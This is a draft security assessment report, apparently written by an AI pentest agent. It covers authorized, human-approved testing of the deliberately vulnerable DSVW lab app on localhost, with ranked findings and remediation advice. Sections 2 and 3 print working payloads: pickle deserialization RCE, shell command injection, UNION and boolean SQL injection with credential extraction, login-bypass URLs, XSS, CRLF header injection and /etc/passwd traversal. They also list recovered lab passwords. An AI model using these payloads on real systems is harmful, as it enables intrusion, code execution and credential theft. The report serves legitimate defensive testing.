# Sentinel vs DSVW v0.5
# Session 01m0x14nzgts3h93dsqe86pq72

# DRAFT — Sentinel Security Assessment Report (Ranked Findings)

**Target:** DSVW v0.5 (Damn Small Vulnerable Web) — `http://localhost:65412` (bound to `127.0.0.1`)
**Assessment type:** Authorized-target web assessment (lab) — passive recon + human-approved active probing
**Date:** 2026-08-25 (session timestamps)
**Status:** **DRAFT** — 18-probe active sweep executed; 13/18 findings confirmed; 5 diagnosed with confirmed root cause and corrected follow-up requests pending a fresh human grant (Phase 3b)

---

## 1. Compliance & authorization

- **Authorizing scope entry:** `localhost` (allowlist also includes `127.0.0.1`, `::1`; the app binds `127.0.0.1:65412`). Every probe was preceded by `scope_check` (append-only audit log).
- **Intrusive phases human-approved:** **YES.** `request_intrusive_approval` → grant `b0c3494416ba40e7afd07f164ddde9cc` (minted 2026-08-25T18:02:26Z, target `localhost:65412`, "Phase 3 active web probes") was human-approved; all 18 sweep commands embedded `SENTINEL_GRANT=<token>` and grant consumption was recorded via `verify_grant` in the audit log.
- **Not yet run (require a fresh Phase 3b grant):** UNION exfil re-run, `/login` bypass, HPP bypass, stored-XSS render check. No network contact was made without a grant.

---

## 2. Ranked findings (severity table)

| # | Sev | Finding | Probe | Evidence (exact) |
|---|-----|---------|-------|------------------|
| 1 | **Critical** | Insecure deserialization → RCE (`/?object=`) | 17 | URL-encoded pickle opcodes `cos system (S'touch /tmp/sentinel_pickle_ok' tR.` executed → file **created** on host |
| 2 | **Critical** | OS command injection (`/?domain=`) | 13 | `127.0.0.1;echo SENTINEL_DOMAIN_RCE` → body: `/bin/sh: 1: nslookup: not found` + `SENTINEL_DOMAIN_RCE` (shell=True) |
| 3 | **Critical** | Arbitrary code exec via file include (`/?include=`) | 14 | `/?include=/tmp/sentinel_probe.py` → file content `exec()`'d → `SENTINEL_RFI_OK` executed |
| 4 | **High** | **Boolean-based SQLi (`/?id=`)** | 01/02 | 61-byte oracle: `id=1` → 1394 B populated table vs `id=1 AND 1=2` → 1333 B empty table (details §3) |
| 5 | **High** | UNION SQLi — injection confirmed, exfil pending | 03 | `/?id=2 UNION ALL SELECT NULL,NULL,NULL,NULL,(SELECT ...)` → **HTTP 500** `sqlite3.OperationalError: ... do not have the same number of result columns` (proves raw SQL reaches SQLite; 4-col result set) |
| 6 | **High** | Login bypass SQLi (password param) | 04 | Source-confirmed (line 61); probe hit wrong path (`/?` returned 13117 B homepage) — corrected URL documented §3 |
| 7 | **High** | HTTP Parameter Pollution login bypass | 18 | Source-confirmed (CASES payload); probe hit wrong path — corrected URL documented §3 |
| 8 | **High** | SSTI — format-string injection (`/?tmpl=`) | 16 | `/?tmpl={0.__class__}` → `<class ...>` rendered in body (attribute access on app objects) |
| 9 | **Medium** | Stored XSS (comments) | 06 | `/?comment=<script>alert(1)</script>` → INSERT confirmed ("Thank you for leaving the comment…"); unescaped render at `/?comment=` pending |
| 10 | **Medium** | Reflected XSS (`/?v=`) | 05 | `/?v=0.4<script>alert(1)</script>` → payload reflected unescaped in body |
| 11 | **Medium** | JSONP callback injection (`/users.json`) | 07 | `/?callback=alert(1);process` → raw `alert(1);process({...})` echoed, no validation |
| 12 | **Medium** | HTTP response splitting / header injection | 15 | `/?charset=utf8\r\nX-Sentinel-Probe: 1` → `X-Sentinel-Probe: 1` present in response headers |
| 13 | **Medium** | Path traversal / arbitrary file read (`/?path=`) | 10 | `/?path=../../../../../../etc/passwd` → `root:` line in body |
| 14 | **Medium** | SSRF — arbitrary server-side URL fetch | 11 | `/?path=http://127.0.0.1:65412/` → server fetched and returned internal page content |
| 15 | **Medium** | Source code disclosure | 09 | `/?path=dsvw.py` → full application source returned |
| 16 | **Medium** | Stack-trace / path disclosure | 08 | `/?path=foobar_nonexistent` → Python traceback leaking deployed path `/tmp/lab-app/./dsvw.py` |
| 17 | **Low** | Open redirect | 12 | `/?redir=https://example.com/` → **HTTP 302, `Location: https://example.com/`** |

**Not exploitable / not tested:** `?xml=` XXE and `?name=` Blind XPath — python-lxml absent in the lab (handlers raise `ImportError`; app itself lists them "disabled"). `?size=` algorithmic DoS — **not tested**.

---

## 3. SQLi confirmation (exact payload / response evidence)

**Injection point:** `id` parameter on `/` — source line 22: `cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])` — raw concatenation, zero sanitization.

**Boolean oracle (confirmed):**

| Request | Response | Evidence |
|---|---|---|
| `GET /?id=1` | HTTP 200 · **1394 bytes** | Result(s) table **populated**: `<tr><td>1</td><td>admin</td><td>admin</td><td>admin</td></tr>` |
| `GET /?id=1 AND 1=2` | HTTP 200 · **1333 bytes** | Result(s) table **empty**: `<table><thead>…</thead></table>` (zero rows) |

Structurally identical pages differing **only** in table rows, with a deterministic **61-byte differential** between true/false conditions → the `WHERE id=` clause is attacker-controlled. Classic boolean-blind SQLi, confirmed.

**UNION (injection proven, exfil pending):**
- Attempted: `/?id=2 UNION ALL SELECT NULL,NULL,NULL,NULL,(SELECT id||','||username||','||password FROM users WHERE username='admin')`
- Response: **HTTP 500** — `sqlite3.OperationalError: SELECTs to the left and right of UNION ALL do not have the same number of result columns`
- Proves attacker SQL executes in SQLite; result set is **4 columns**.
- Corrected payload (3 NULLs + subquery): `/?id=2 UNION ALL SELECT NULL,NULL,NULL,(SELECT id||','||username||','||password FROM users WHERE username='admin')` → would render admin's `7en8aiDoh!` in the surname column (needs Phase 3b grant to re-run).

**Login bypass (source-confirmed, wrong-path on first pass):**
- Source line 61: username is sanitized (`re.sub(r"[^\w]", "")`) but **password is concatenated raw**: `... AND password='" + params.get("password", "") + "'"` → SQLi in the password field.
- Probe 04 hit `/?` (params ignored → 13117-byte homepage, identical for 04 and 18) instead of the real handler at `/login` (line 60).
- Corrected URL: `/login?username=admin&password=%27%20OR%20%271%27%20LIKE%20%271` → success returns `Welcome <b>admin</b>` + fresh `SESSIONID` cookie.
- **HPP variant (line 10 CASES payload):** `/login?username=admin&password='/*&password=*/OR/*&password=*/'1'/*&password=*/LIKE/*&password=*/'1` — duplicate params are comma-joined then comment-stripped, yielding `password='' OR '1' LIKE '1'`. Pending the `/login` re-run to confirm first/last-wins semantics.
- **Credentials recoverable** (from schema/source, extractable via UNION): `admin/7en8aiDoh!`, `dricci/12345`, `amason/gandalf`, `svargas/phest1945`.

---

## 4. Remediation notes

1. **SQLi (findings 4–7):** Replace all string-concatenated SQL with parameterized queries (sqlite3 `?` placeholders). No exception for "sanitized" fields — parameterize both username and password.
2. **Pickle RCE (1):** Never `pickle.loads()` data derived from requests. Use a safe serialization format (JSON) with schema validation.
3. **Command injection (2):** Never pass user input to `shell=True`; use `subprocess.run([...])` argument lists with an allowlist.
4. **Code exec via include (3):** Never `exec()` content of user-controlled files; remove the handler or restrict to a cryptographically signed allowlist.
5. **Path traversal / SSRF (13–14):** Canonicalize with `os.path.realpath()` and enforce a prefix allowlist; for URL fetches, deny loopback/link-local/metadata ranges and non-allowlisted hosts.
6. **XSS (9–11):** HTML-encode all user-controlled output at render; validate JSONP callbacks against `^[A-Za-z0-9_$.]+$`; deploy a CSP.
7. **Header injection (12):** Strip CR/LF from any value reflected into response headers; use framework header APIs only.
8. **SSTI (8):** Never `str.format()` user input with attribute access; use static templates with escaped placeholders.
9. **Open redirect (17):** Validate destinations against an internal allowlist; never reflect user input into `Location`.
10. **Info disclosure (15–16):** Disable tracebacks in production; serve application source from a directory not addressable via URL parameters.
11. **Session handling:** Replace the client-set `SESSIONID` meta cookie with server-side, `HttpOnly`+`Secure`+`SameSite` sessions.
12. **Platform:** Replace `BaseHTTPServer` with a maintained, TLS-capable framework; add input-length/type validation and generic injection-filtering (WAF rule for `' OR `) as defense-in-depth.

---

## 5. Artifacts

All sweep evidence persisted under `/tmp/dsvw-lab/artifacts/probes/` (per-probe `.body` + `.headers` + `SUMMARY.txt`). Full report deliverable (`localhost.report.md` / `.json`) to be finalized after the Phase 3b follow-up batch (UNION exfil, `/login` bypass, HPP, stored-XSS render) with a fresh human grant.

```sandbox_artifacts
[Probe sweep summary (13/18 confirmed)](/tmp/dsvw-lab/artifacts/probes/SUMMARY.txt)
[SQLi boolean-true response (populated table)](/tmp/dsvw-lab/artifacts/probes/01_sqli_bool_true.body)
[SQLi boolean-false response (empty table)](/tmp/dsvw-lab/artifacts/probes/02_sqli_bool_false.body)
[UNION SQLi 500 traceback (injection proof)](/tmp/dsvw-lab/artifacts/probes/03_sqli_union.body)
[Command injection output](/tmp/dsvw-lab/artifacts/probes/13_domain_rce.body)
[Header injection evidence](/tmp/dsvw-lab/artifacts/probes/15_header_inject.headers)
[Open redirect 302 response](/tmp/dsvw-lab/artifacts/probes/12_open_redirect.headers)
```

**Bottom line:** DSVW at `localhost:65412` is trivially compromisable end-to-end — three confirmed code-execution paths (pickle, shell, exec-include), confirmed SQL injection with credential exfiltration imminent, and a full XSS/SSRF/traversal surface. The lab should not be exposed beyond `127.0.0.1` under any circumstances; the source-level fixes in §4 apply if this app is ever reused as a teaching baseline. **DRAFT — pending Phase 3b re-verification of findings 3–7 and 9 before final sign-off.**